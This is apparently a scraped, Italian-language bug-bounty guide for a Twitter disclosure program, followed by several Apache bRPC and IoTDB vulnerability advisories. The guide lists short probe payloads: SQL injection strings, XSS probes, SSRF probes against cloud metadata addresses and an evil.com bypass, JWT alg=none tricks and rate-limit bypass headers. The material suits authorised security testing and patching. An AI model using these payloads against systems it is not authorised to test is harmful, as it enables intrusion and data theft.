titolo: twitter Vulnerability Disclosure Program
descrizione: twitter public bug bounty program

scope: App mobile su Google Play / App Store
outOfScope: Attacchi DDoS / volumetrici
Social engineering su dipendenti
Test su ambienti di produzione con dati reali di utenti
Spam o invio massivo di contenuti
Vulnerabilità in browser di terze parti (es. Chrome bugs)
Rate limiting issues senza impatto reale
Self-XSS (richiede azione della vittima)
Vulnerabilità che richiedono accesso fisico al device
Clickjacking su pagine senza azioni sensibili
Best practice senza impatto dimostrabile
Username/email enumeration su form pubblici
CSRF su endpoint non state-changing
Vulnerabilità già note pubblicamente senza PoC aggiuntivo
Problemi di SPF/DKIM/DMARC
Mixed content warnings su pagine non autenticabili

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
quickStartGuide: Step 1: Leggi TUTTO il policy del programma su twitter
Step 2: Configura Burp Suite con il proxy del tuo browser (FoxyProxy)
Step 3: Crea due account: attaccante e vittima su due browser diversi
Step 4: Mappa tutte le feature: signup, login, profilo, pagamenti, API
Step 5: Inizia con OWASP Top 10 e tools automatici (nuclei, sqlmap)
Step 6: Testa manualmente la business logic (sconti, ruoli, workflow)
Step 7: Documenta OGNI cosa interessante
Step 8: Scrivi un report chiaro con PoC riproducibile in 5 minuti
Step 9: Submeti e rispondi velocemente a domande del triage
Step 10: Studia i report pubblici (HackerOne Hacktivity) per imparare
tips: 💡 Leggi almeno 50 report risolti su HackerOne Hacktivity prima di iniziare
💡 Concentrati su UN programma per almeno 2 settimane
💡 Le business logic bug pagano DI PIÙ delle XSS
💡 I bug race condition sono sottovalutati ma pagati
💡 Usa Wayback Machine (web.archive.org) per trovare endpoint dimenticati
💡 Controlla sempre le API mobile vs web
💡 Non riportare MAI self-XSS, clickjacking senza impatto
💡 Impara Burp a livello avanzato: macro, match/replace, scanner
💡 La qualità del report > quantità
💡 Network: Discord Bugcrowd, NahamSec, InsiderPhD, STÖK

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

testingTechniques.name: API Endpoint Discovery
testingTechniques.description: Mappa tutti gli endpoint API, parametri e metodi accettati
steps: Intercetta traffico con Burp Suite o OWASP ZAP
Usa kiterunner o wordlists API comuni
Testa metodi HTTP alternativi: PUT, DELETE, PATCH, OPTIONS
Verifica GraphQL introspection se presente
Leggi documentazione API pubblica su /docs, /swagger

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

titolo: CVE-2026-48830: Improper authentication in Apache bRPC through 1.17.0 allows a remote unauthenticated attacker to by...
descrizione:
Improper authentication in Apache bRPC through 1.17.0 allows a remote unauthenticated attacker to bypass authentication for protected non-builtin HTTP endpoints by first sending a builtin HTTP request on the same HTTP/1.1 keep-alive connection.

When ServerOptions.auth is enabled and builtin HTTP services are exposed on the public listener, a builtin request received as the first message on a socket may cause the connection to be treated as authenticated for later requests on that socket. Users are recommended to upgrade to version 1.18.0, which fixes this issue, or apply this PR separately:  https://github.com/apache/brpc/pull/3308

titolo: CVE-2026-54425: Uncontrolled recursion in the HTTP/2 HPACK decoder in Apache bRPC before 1.18.0 allows remote attack...
descrizione:
Uncontrolled recursion in the HTTP/2 HPACK decoder in Apache bRPC before 1.18.0 allows remote attackers to cause denial of service by sending a crafted HTTP/2 header block containing many consecutive Dynamic Table Size Update entries. Each update was decoded by recursively invoking the HPACK decoder, which could exhaust the thread stack before a header field or end of input was reached.

Root Cause:
The bRPC HPACK decoder recursively decoded the next entry after processing a Dynamic Table Size Update. The decoder did not bound the recursion depth, so a long sequence of update entries could consume excessive stack space.

Affected Scenarios:
Use bRPC with the built-in HTTP/2 implementation to accept HTTP/2 traffic from an untrusted network.

How to Fix:
1. Upgrade bRPC to version 1.18.0, which fixes this issue.
2. Apply this patch:  https://github.com/apache/brpc/pull/3343 

Note:
The fix changes HPACK Dynamic Table Size Update decoding to use iterative parsing instead of recursive parsing.

titolo: CVE-2026-56386: Integer underflow and out-of-bounds read in the HTTP/2 server DATA frame parser in Apache bRPC allow...
descrizione:
Integer underflow and out-of-bounds read in the HTTP/2 server DATA frame parser in Apache bRPC allows an unauthenticated remote attacker to cause denial of service by sending a malformed DATA frame with the PADDED flag set and a zero-length payload.

Root Cause:
The HTTP/2 DATA frame handler computed the fragment size from the attacker-controlled payload length and, when the PADDED flag was present, decremented the fragment size before ensuring that the frame contained the mandatory pad length byte. A zero-length padded DATA frame could therefore underflow the unsigned fragment size and read the pad length byte past the end of the frame buffer.

Affected Scenarios:
Apache bRPC servers that accept HTTP/2 traffic are affected when a remote client can send crafted HTTP/2 frames to the server. HTTP/2 may be reached through cleartext h2c detection on an HTTP port or through TLS ALPN negotiation.

How to Fix:
(Choose one of the following options)
1. Upgrade Apache bRPC to version 1.18.0, which fixes this issue.
2. Apply this patch:  https://github.com/apache/brpc/pull/3325 

Note:
The fix validates that a padded DATA frame has enough payload bytes for the pad length field before decrementing the fragment size or reading the pad length byte. Malformed zero-length padded DATA frames are rejected with HTTP/2 FRAME_SIZE_ERROR.

titolo: CVE-2026-56387: The RTMP AMF parser in Apache bRPC accepts AMF string lengths and array counts directly from untrust...
descrizione:
The RTMP AMF parser in Apache bRPC accepts AMF string lengths and array counts directly from untrusted input. A remote unauthenticated attacker who can reach a bRPC server with RTMP enabled can send a small AMF payload with an excessive declared long string length or array count, causing excessive memory allocation or resource consumption before the parser rejects the incomplete payload.

Root Cause:
The AMF long string parser resized the destination string to the declared 32-bit length before validating that the stream contained that many bytes. ECMA array and strict array parsers also accepted 32-bit element counts without a configurable upper bound.

Affected Scenarios:
Deployments that enable the bRPC RTMP server component and accept RTMP traffic from untrusted clients. Direct uses of the AMF parser on untrusted data are also affected.

How to Fix:
1. Upgrade bRPC to version 1.18.0, which fixes this issue.
2. Apply this patch:  https://github.com/apache/brpc/pull/3353 

Note:
The fix introduces configurable AMF parsing limits. The default maximum string size is 64 MiB and the default maximum array element count is 1,048,576. Payloads above these limits are rejected. The limits can be adjusted with amf_max_string_size and amf_max_array_size.

titolo: CVE-2026-56388: The Redis server command parser in Apache bRPC accepts an empty RESP array as a command header. A re...
descrizione:
The Redis server command parser in Apache bRPC accepts an empty RESP array as a command header. A remote unauthenticated attacker who can reach a bRPC server with Redis service enabled can send an empty array header followed by a bulk string, causing an out-of-bounds write in the parser and crashing the process.

Root Cause:
RedisCommandParser::ConsumeImpl rejected negative RESP array counts but accepted zero. It resized the command argument vector to zero elements and continued parsing. When a following bulk string was parsed, the only index guard was a CHECK. In configurations where fatal logs do not abort immediately, execution could continue and write to _args[0] even though the vector was empty.

Affected Scenarios:
Deployments that enable ServerOptions.redis_service and accept Redis protocol traffic from untrusted clients. The issue is reached during parsing before command handling or authentication.

How to Fix:
1. Upgrade bRPC to version 1.18.0, which fixes this issue.
2. Apply this patch:  https://github.com/apache/brpc/pull/3354 

Note:
The fix rejects empty RESP arrays as invalid Redis commands and replaces the internal index CHECK with an explicit parse error so malformed command streams cannot fall through to an indexed vector write.

titolo: CVE-2026-58064: The Redis protocol implementation in Apache bRPC allowed inline command parsing to allocate and copy...
descrizione:
The Redis protocol implementation in Apache bRPC allowed inline command parsing to allocate and copy the full connection buffer before a complete CRLF-terminated command was available. A remote attacker with access to a Redis-protocol bRPC service could send long inline inputs without a terminating CRLF to increase memory usage and CPU copy overhead, potentially causing denial of service.


Root Cause:
The Redis inline command parser allocated memory based on the current input buffer size and copied the entire buffer before determining the current inline command boundary. The existing redis_max_allocation_size limit was applied to RESP bulk strings and arrays, but not effectively to the inline command path before allocation.


Affected Scenarios:
Use Apache bRPC server with Redis protocol enabled and reachable by untrusted clients.


How to Fix:
1. Upgrade Apache bRPC to version 1.18.0, which fixes this issue.
2. Apply the patch from PR  https://github.com/apache/brpc/pull/3363 .

titolo:
CVE-2026-59229: The Legacy Pipe receiver protocol (handshake / sendPipeData) uses a
hardcoded SUPER_USER (root) iden...
descrizione:
The Legacy Pipe receiver protocol (handshake / sendPipeData) uses a
hardcoded SUPER_USER (root) identity when executing data loading and
deletion operations. A user with only SYSTEM-level privileges (such as
USE_PIPE or MAINTAIN) who does NOT have WRITE_DATA or DELETE_DATA
permissions on target databases can send specially crafted PipeData
messages through the Legacy Pipe API, resulting in data loading/deletion
operations executed as root — effectively bypassing IoTDB's permission
model entirely.



This issue affects Apache IoTDB: from 2.0.0 before 2.0.11.



Users are recommended to upgrade to version 2.0.11, which fixes the issue.

titolo: CVE-2026-61902: Apache bRPC versions before 1.18.0 do not consistently enforce the configured max_body_size limit in...
descrizione:
Apache bRPC versions before 1.18.0 do not consistently enforce the configured max_body_size limit in non-progressive HTTP/1 and HTTP/2 parsing and in memcache and couchbase response parsing.

A remote unauthenticated peer can cause an affected process to buffer message data beyond the configured limit, which may lead to memory exhaustion and denial of service. 
Users should upgrade to 1.18.0 or apply the patch from PR  https://github.com/apache/brpc/pull/3382 . The fix rejects oversized buffered HTTP bodies, returns HTTP 413 for HTTP/1 requests, resets oversized HTTP/2 streams, and rejects oversized memcache and couchbase responses from their declared lengths. Progressive HTTP reading remains supported because it uses bounded buffering.

titolo: CVE-2026-61916: Out-of-bounds reads in URL parsing and case-insensitive header lookup in Apache bRPC before version ...
descrizione:
Out-of-bounds reads in URL parsing and case-insensitive header lookup in Apache bRPC before version 1.18.0 on platforms where plain char is unsigned, such as ARM64, allow remote attackers to cause a process crash and denial of service by sending crafted input containing bytes with the high bit set.

Root Cause:
Two 256-entry lookup tables are accessed through pointers biased by 128 so that valid indices are in the range -128 to 127. Input bytes are promoted from plain char to int without first normalizing them to the signed-char range. On affected platforms, bytes in the range 0x80 to 0xFF therefore become indices 128 to 255 and read up to 127 bytes beyond the end of the underlying tables.

Affected Scenarios:
A remotely accessible bRPC HTTP server on an affected platform can reach the vulnerable URL lookup through an unauthenticated request URI containing a high-bit byte. The case-insensitive lookup is also reachable when untrusted header names are processed through APIs such as the HTTP/2 HPACK path. HTTP/1 header names containing high-bit bytes are rejected by the HTTP/1 parser before reaching the vulnerable lookup. Builds where plain char is signed, which commonly include x86_64 builds, are not affected by this issue.

How to Fix:
Choose one of the following options:
1. Upgrade Apache bRPC to version 1.18.0 or later.
2. Apply the patch from  https://github.com/apache/brpc/pull/3376 .

The fix normalizes lookup-table indices to the signed-char range before accessing the biased tables.

titolo: CVE-2026-66392: Apache bRPC versions before 1.18.0 validate the server certificate chain when client TLS peer verifi...
descrizione:
Apache bRPC versions before 1.18.0 validate the server certificate chain when client TLS peer verification is enabled, but do not bind the certificate to an expected DNS name or IP address. A network attacker who can redirect or intercept a connection and who possesses a certificate issued by a CA trusted by the client for another name may impersonate the requested TLS endpoint.


Affected Scenarios:
Applications use a bRPC client Channel to connect to an untrusted network with certificate verification enabled and trust a CA that can issue certificates for identities other than the intended endpoint.


How to Fix:
Upgrade to Apache bRPC 1.18.0 and enable VERIFY_PEER with a positive verify_depth. HTTPS Channels automatically verify the certificate against the host in the Channel URL. Callers may set VerifyOptions::expected_peer_name explicitly when the certificate identity differs from the URL host. Alternatively, apply the patch from  https://github.com/apache/brpc/pull/3408 .

Note:
The new option performs DNS SAN or IP SAN verification during the TLS handshake. Configurations that set expected_peer_name while peer verification is disabled are rejected.

titolo: CVE-2026-74755: An integer underflow in the mcpack2pb component of Apache bRPC (version < 1.18.0) on all platforms a...
descrizione:
An integer underflow in the mcpack2pb component of Apache bRPC (version < 1.18.0) on all platforms allows remote attackers to crash a bRPC server by sending a request containing a string field with a zero value_size. The UnparsedValue::as_string() function computes `_size - 1` without validating `_size`; when value_size is 0 the expression underflows to SIZE_MAX, resize() throws std::length_error, and because the exception is not caught on the request parsing path the process aborts (SIGABRT).

Root Cause:
In src/mcpack2pb/parser.cpp, UnparsedValue::as_string() resizes the output string to `_size - 1`, where `_size` is the value_size of a string field taken directly from the network data. A value_size of 0 underflows the unsigned size_t, and the subsequent resize() throws an exception that is not caught.

Affected Scenarios:
bRPC servers that accept nshead frames wired to the ubrpc mcpack2 adaptor (for example the NsheadService + UbrpcMcpack2Adaptor deployment pattern) can be crashed by a single unauthenticated request. Stock open-source bRPC registers the ubrpc/nshead_mcpack protocols as client-only, so default server configurations are not affected.

How to Fix:
1. Upgrade bRPC to a version that includes this fix.
2. Apply the patch in PR  https://github.com/apache/brpc/pull/3450

titolo: CVE-2026-74757: Uncontrolled resource allocation in the mcpack2pb component in Apache bRPC (version < 1.18.0) on all...
descrizione:
Uncontrolled resource allocation in the mcpack2pb component in Apache bRPC (version < 1.18.0) on all platforms allows remote attackers to make the server allocate a large amount of memory via sending a crafted mcpack request with a huge array item count.

Root Cause:
The bRPC mcpack2pb parser trusts the item count stored in the mcpack array header without validating it against the actual payload size. The code generated by the mcpack2pb protoc plugin uses this count to preallocate memory for repeated protobuf fields via Reserve(). A malformed request declaring item_count = 0x7fffffff can force the server to preallocate about 16GB of virtual memory, which may abort the process (SIGABRT) on memory-constrained hosts.

Affected Scenarios:
Use a bRPC server that wires a NsheadService to UbrpcMcpack2Adaptor (the Baidu ubrpc deployment pattern) and parses requests with code generated by the mcpack2pb protoc plugin. The request body is parsed before authentication.

How to Fix:
(Choose one of the following options)
1. Upgrade bRPC to version 1.18.0, which fixes this issue.
2. Apply this patch:  https://github.com/apache/brpc/pull/3451 

Note:
No matter which option you choose, you should know that the fix caps the array item count to the remaining bytes of the array payload.

titolo: CVE-2026-74758: A heap use-after-free in the RTMP protocol component of Apache bRPC (versions < 1.18.0) allows a rem...
descrizione:
A heap use-after-free in the RTMP protocol component of Apache bRPC (versions < 1.18.0) allows a remote attacker to crash a bRPC RTMP server by sending a crafted Abort control message. No authentication or application-level request is required.

Root Cause:
When an RTMP Abort control message names the chunk stream that is currently being parsed (the chunk stream carrying the message itself), RtmpChunkStream::OnAbortMessage calls RtmpContext::ClearChunkStream, which deletes the RtmpChunkStream while its Feed() is still running. After the message handler returns, Feed() continues to access members of the deleted object, resulting in a heap-use-after-free.

Affected Scenarios:
bRPC servers that enable RTMP support (ServerOptions.rtmp_service set) and accept connections from untrusted networks.

How to Fix:
1. Upgrade bRPC to version 1.18.0, which fixes this issue.
2. Apply this patch:  https://github.com/apache/brpc/pull/3452 

The fix skips clearing the chunk stream when the Abort message targets the chunk stream that is currently being parsed.

titolo: CVE-2026-78048: A reachable-assertion flaw in the HPACK header-compression decoder of the HTTP/2 (h2/gRPC) stack in ...
descrizione:
A reachable-assertion flaw in the HPACK header-compression decoder of the HTTP/2 (h2/gRPC) stack in Apache bRPC (version < 1.18.0) on all platforms allows a remote attacker to crash the server process by sending a crafted sequence of HPACK headers, resulting in a denial of service.

Root Cause:
In src/brpc/details/hpack.cpp, IndexTable::Init sizes the dynamic-table ring buffer as num_headers = max_size / (32 + 2), i.e. it assumes a minimum table entry of 34 bytes (name >= 1 byte + value >= 1 byte + 32 bytes of overhead). However, RFC 7541 section 4.1 specifies that the minimum entry size is 33 bytes, because the value may be empty (name >= 1 byte + value == 0 + 32 bytes). For the default 4096-byte table this allocates only 120 slots (4096/34). Eviction in AddHeader is driven by byte usage (_max_size), not by slot count, so a peer can add 121 minimal 33-byte entries (121*33 = 3993 <= 4096) without triggering eviction. The 121st AddHeader then hits CHECK(!_header_queue.full()), which aborts the process.

Affected Scenarios:
Use a bRPC server that serves HTTP/2 or gRPC requests (e.g. via the h2 protocol) from an untrusted network. The malicious header block is processed during HPACK decoding of incoming requests without authentication.

How to Fix: 
(Choose one of the following options) 
1. Upgrade bRPC to version 1.18.0, which fixes this issue.
2. Apply this patch: https://github.com/apache/brpc/pull/3462

Note:
The fix sizes the dynamic table for the 33-byte minimum entry (max_size / (32 + 1)) and ensures at least one ring-buffer slot is kept when max_size is smaller than the minimum entry, so that initialization cannot fail on malloc(0).

titolo: CVE-2026-78058: Uncontrolled resource consumption in the HTTP/2 (h2) receive path of Apache bRPC (version < 1.18.0) ...
descrizione:
Uncontrolled resource consumption in the HTTP/2 (h2) receive path of Apache bRPC (version < 1.18.0) on all platforms allows a remote unauthenticated attacker to crash the server or grow its memory without bound by sending crafted HTTP/2 frames.

Root Cause:
The h2 parser, enabled by default on every bRPC server port and used by h2/gRPC clients, trusts the peer to respect receive-side limits that bRPC advertises but never enforces:
1. SETTINGS_MAX_CONCURRENT_STREAMS defaulted to unlimited and was never checked on the server, letting a peer pin an unbounded number of pending streams per connection (~100x memory amplification).
2. SETTINGS_MAX_HEADER_LIST_SIZE defaulted to unlimited and was never enforced; 1-byte HPACK indexed references amplify a small HEADERS frame ~4000x into an unbounded decoded header list ("HPACK bomb"), and a never-completed HEADERS/CONTINUATION block accumulates memory without limit.
3. Control-frame acks (PING/SETTINGS acks, RST_STREAM, GOAWAY, WINDOW_UPDATE) unconditionally bypassed the -socket_max_unwritten_bytes write cap, so a PING flood combined with withheld TCP reads grew the connection buffer without the documented bound.
4. The HPACK dynamic table size update was validated against the protocol default (4096) instead of the advertised SETTINGS_HEADER_TABLE_SIZE, which together with the dynamic-table queue/accounting issue can desynchronize the decoder and dereference NULL (crash).

Affected scenarios:
Any bRPC server serving HTTP/h2/gRPC to an untrusted network, and any bRPC h2/gRPC client connecting to an untrusted backend. The h2 parser runs before any Authenticator check on the shared port.

How to fix: 
Upgrade bRPC, or apply the patch in https://github.com/apache/brpc/pull/3474.

Note:
After applying the fix the following limits are enforced by default:
- max_concurrent_streams: 1024 per connection (4294967295 restores unlimited).
- max_header_list_size: 1 MiB decoded size per stream (4294967295 restores unlimited; -h2_client_max_header_list_size for clients).
- h2 control-frame acks respect -socket_max_unwritten_bytes (-h2_ack_ignore_eovercrowded restores the old behavior).
Requests exceeding these limits are rejected (RST_STREAM(REFUSED_STREAM) or a connection error).

titolo: CVE-2026-78066: Resource exhaustion in Apache bRPC (version < 1.18.0) on all platforms: multiple parsers that accept...
descrizione:
Resource exhaustion in Apache bRPC (version < 1.18.0) on all platforms: multiple parsers that accept wire-controlled input bound no limit on the sizes declared by the client or on decompressed output, which attackers can use to drive disproportionate memory use and crash the process.

Root Cause:
1) The gzip/zlib/snappy decompressors enforce no output limit: -max_body_size is checked against the compressed bytes only, so a cap-compliant body (e.g. 64 MiB) can decompress to tens of GiB.
2) The AMF string readers allocate the declared length before the bytes are actually available.
3) RTMP chunk headers may re-declare a message length mid-stream; the declared length was never bounded and the partial reassembly buffer kept growing.
4) The sofa-pbrpc parser does not bound meta_size.
5) mcpack2pb trusts wire-declared item counts for Reserve() and a string value_size of 0 underflows the buffer size, aborting the process.

Affected Scenarios:
Any bRPC service accepting gzip/zlib/snappy-compressed bodies or rtmp, sofa-pbrpc, or mcpack2pb messages from untrusted clients.

How to Fix:(Choose one of the following options) 1. Upgrade bRPC to version 1.18.0, which fixes this issue.

2. Apply this patch: https://github.com/apache/brpc/pull/3476

Note:
After the fix, requests whose decompressed size, RTMP message length, or mcpack declared count exceed the new limits are rejected. Operators who legitimately need larger values can raise the corresponding flag (-max_decompressed_body_size, max_body_size).

titolo: CVE-2026-78334: Missing authentication in the streaming RPC path of Apache bRPC (version < 1.18.0) on all platforms ...
descrizione:
Missing authentication in the streaming RPC path of Apache bRPC (version < 1.18.0) on all platforms allows a remote attacker to bypass server authentication and inject or deliver streaming frames, when a server is configured with an Authenticator.

Root Cause:
When authentication is configured, streaming RPC frames are consumed directly by the streaming parser (ParseStreamingMessage) and never pass through InputMessenger's authentication hook, so an unauthenticated peer can exchange frames without being authenticated. In addition, a server-accepted stream is bound lazily to the first frame that happens to carry its id, so a stream could accept a frame carrying its id from a socket other than the socket that created the stream.

Affected Scenarios:
A bRPC server configured with authentication that serves streaming RPC from an untrusted network, or a deployment where a foreign connection can impersonate a stream by id, can be made to accept unauthorized streaming frames.

How to Fix:
Upgrade bRPC to 1.18.0, which fixes this issue, or apply the patch in PR https://github.com/apache/brpc/pull/3481. 

Note:
The fix rejects streaming frames on server sockets when configured authentication has not completed, and keeps server-accepted streams bound to the socket of their creating RPC and rejects frames arriving from another socket. Authenticated streaming RPC behavior and the wire format are unchanged; only unauthenticated or foreign-socket frames are now rejected.

titolo: CVE-2026-79704: An out-of-bounds read vulnerability exists in the streaming RPC client of Apache bRPC (versions 1.11...
descrizione:
An out-of-bounds read vulnerability exists in the streaming RPC client of Apache bRPC (versions 1.11.0 through  1.17.0) on all platforms. A client that creates multiple streams in a single RPC expects the server response to carry exactly one extra_stream_id for every additional stream. The response handling path indexed the returned identifiers using the locally created stream count without first validating the size of the returned list, so a malicious or compromised server (or an on-path attacker) can trigger an out-of-bounds read in the client by returning a malformed StreamSettings response with fewer extra_stream_ids than expected. This may crash the client process (denial of service) or leak unintended memory contents into subsequent stream handling; surplus identifiers have no valid client-stream mapping and are processed inconsistently.

Root Cause:
Since bRPC 1.11.0, a client can create multiple streams in one RPC via batch StreamCreate. The expected behavior is that the server response must return exactly (N-1) extra_stream_ids, where N is the number of locally created streams. In Controller::HandleStreamConnection, the response path reads extra_stream_ids[i-1] for each additional local stream without first comparing the returned list size with (N-1). If the server returns fewer identifiers, the read runs past the end of the returned list (out-of-bounds read); if it returns more, the surplus identifiers have no corresponding client-side stream.

Affected Scenarios:
A bRPC client using multi-stream RPC (creating more than one stream in a single RPC) that connects to an untrusted, malicious, or compromised server or to a server reached through an untrusted network path. The server sends a malformed StreamSettings response to trigger the issue.


How to Fix: 
(Choose one of the following options) 
1. Upgrade bRPC to version 1.18.0, which fixes this issue.
2. Apply this patch:  https://github.com/apache/brpc/pull/3485 


Note:
The fix makes the client reject responses whose extra_stream_ids count does not exactly match the number of additional client streams. Such mismatched responses now fail the RPC with ERESPONSE and go through the existing stream cleanup path, instead of being partially processed.

titolo: CVE-2026-80463: Unbounded memory accumulation in the stream message reassembly path of Apache bRPC (version < 1.18.0...
descrizione:
Unbounded memory accumulation in the stream message reassembly path of Apache bRPC (version < 1.18.0) on all platforms allows remote attackers to exhaust the memory of a server (denial of service) by sending an endless sequence of continuation data frames.

Root Cause:
The streaming RPC protocol bounds every single data frame by max_body_size, but a fragmented stream message accumulates continuation frames into one buffer (_pending_buf) without any limit on the accumulated size. A malicious peer that can open a stream can therefore keep sending continuation frames to make the receiver accumulate an arbitrarily large in-memory message. Since the default flow-control settings (socket_max_streams_unconsumed_bytes=0) do not throttle the sending rate, the receiver's memory grows until the process runs out of memory and crashes or becomes unavailable.

Affected Scenarios:
Services that accept streams from untrusted clients (for example using brpc::StreamAccept or brpc::StreamCreate with the built-in streaming protocol) are affected.


How to Fix:
(Choose one of the following options)
1. Upgrade bRPC to version 1.18.0, which fixes this issue.
2. Apply this patch:  https://github.com/apache/brpc/pull/3489 


Note:
The fix limits the accumulated payload of a fragmented stream message to max_body_size (default 64MB). When the accumulated payload exceeds the limit, the pending fragments are released and the stream is closed with error EMSGSIZE. After applying the fix, legitimate fragmented stream messages larger than max_body_size will be rejected; you can adjust the gflag max_body_size to change the limit.

titolo: CVE-2026-81755: Uncontrolled resource consumption in the streaming RPC component of Apache bRPC (version < 1.18.0) a...
descrizione:
Uncontrolled resource consumption in the streaming RPC component of Apache bRPC (version < 1.18.0) allows a remote attacker to exhaust server memory and cause denial of service by sending a single RPC request that declares an excessive number of streams.

Root Cause:
In the streaming RPC feature, a client can declare multiple streams in one RPC request by putting extra stream identifiers into the repeated field `stream_settings.extra_stream_ids` of the RPC meta. On the server side, `StreamAccept` creates one response stream for every stream identifier declared by the request, without limiting the number of streams accepted in a single RPC. The request body size is only bounded by `max_body_size` (default 64MB), which is enough to carry millions of stream identifiers. Each accepted stream allocates its own bthread execution queue and associated resources, so a single crafted request can make the server create a huge number of streams and exhaust memory, leading to denial of service.

Affected Scenarios:
Use a bRPC server that serves streaming RPC and calls `StreamAccept` to accept streams from untrusted clients.

How to Fix: 
(Choose one of the following options) 
1. Upgrade bRPC to the 1.18.0 version.
2. Apply this patch:  https://github.com/apache/brpc/pull/3493 


Note:
